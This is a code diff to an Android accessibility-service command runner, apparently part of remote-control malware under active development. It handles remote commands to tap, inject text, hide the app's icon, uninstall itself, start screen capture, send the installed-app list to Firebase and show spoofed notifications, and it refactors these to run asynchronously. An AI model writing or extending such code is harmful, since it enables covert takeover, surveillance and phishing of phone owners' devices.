@@ -38,8 +38,11 @@ object MacroRunner {
                 val pkg = step.data as? String
                 if (pkg != null) {
                     currentPackage = pkg
-                    service.runOnMainThreadSync { service.launchApp(pkg) } as? Boolean ?: false
-                } else false
+                    service.runOnMainThread { service.launchApp(pkg) }
+                    true
+                } else {
+                    false
+                }
             }
             "wait" -> {
                 val ms = (step.data as? Number)?.toLong() ?: 1000L
@@ -52,17 +55,23 @@ object MacroRunner {
                     val x = map["x"] as? Int
                     val y = map["y"] as? Int
                     if (x != null && y != null) {
-                        service.runOnMainThreadSync { service.tap(x, y) }
+                        service.runOnMainThread { service.tap(x, y) }
                         true
-                    } else false
-                } else false
+                    } else {
+                        false
+                    }
+                } else {
+                    false
+                }
             }
             "type" -> {
                 val text = step.data as? String
                 if (text != null) {
-                    service.runOnMainThreadSync { service.injectText(text) }
+                    service.runOnMainThread { service.injectText(text) }
                     true
-                } else false
+                } else {
+                    false
+                }
             }
             "swipe" -> {
                 val map = step.data as? Map<*, *>
@@ -73,53 +82,55 @@ object MacroRunner {
                     val ey = map["ey"] as? Int
                     val dur = map["dur"] as? Long ?: 300L
                     if (sx != null && sy != null && ex != null && ey != null) {
-                        service.runOnMainThreadSync { service.swipe(sx, sy, ex, ey, dur) }
+                        service.runOnMainThread { service.swipe(sx, sy, ex, ey, dur) }
                         true
-                    } else false
-                } else false
+                    } else {
+                        false
+                    }
+                } else {
+                    false
+                }
             }
             "click_text" -> {
                 val text = step.data as? String
                 if (text != null) {
-                    service.runOnMainThreadSync {
+                    service.runOnMainThread {
                         val root = service.rootInActiveWindow
                         for (node in root?.findAccessibilityNodeInfosByText(text) ?: emptyList()) {
                             if (node.isClickable) {
                                 node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                                return@runOnMainThreadSync true
+                                return@runOnMainThread
                             }
                         }
-                        return@runOnMainThreadSync false
-                    } as? Boolean ?: false
-                } else false
+                    }
+                    true
+                } else {
+                    false
+                }
             }
             "home" -> {
-                service.runOnMainThreadSync { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME) }
+                service.runOnMainThread { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME) }
                 true
             }
             "back" -> {
-                service.runOnMainThreadSync { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) }
+                service.runOnMainThread { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) }
                 true
             }
             "hide_activity" -> {
-                service.runOnMainThreadSync { service.hideAppIcon() }
+                service.runOnMainThread { service.hideAppIcon() }
                 true
             }
             "uninstall" -> {
-                service.runOnMainThreadSync { service.uninstallSelf() }
+                service.runOnMainThread { service.uninstallSelf() }
                 true
             }
             "start_screen_capture" -> {
-                service.runOnMainThreadSync { service.startScreenCapture() }
-                true
-            }
-            "stop_screen_capture" -> {
-                service.runOnMainThreadSync { service.stopScreenCapture() }
+                service.runOnMainThread { service.startScreenCapture() }
                 true
             }
             "get_apps" -> {
                 val apps = service.getInstalledApps()
-                FirebaseBridge.pushInstalledApps(apps)
+                FirebaseBridge.pushAppsList(apps)
                 true
             }
             "fake_notification" -> {
@@ -127,11 +138,13 @@ object MacroRunner {
                 if (map != null) {
                     val title = map["title"] as? String ?: "⚠ Alert"
                     val body = map["text"] as? String ?: "Tap to view"
-                    service.runOnMainThreadSync {
-                        NotificationSpoofer.show(service, title, body, map["iconUrl"] as? String, map["bigPictureUrl"] as? String)
+                    service.runOnMainThread {
+                        NotificationSpoofer.show(service, title, body, null, null)
                     }
                     true
-                } else false
+                } else {
+                    false
+                }
             }
             else -> false
         }
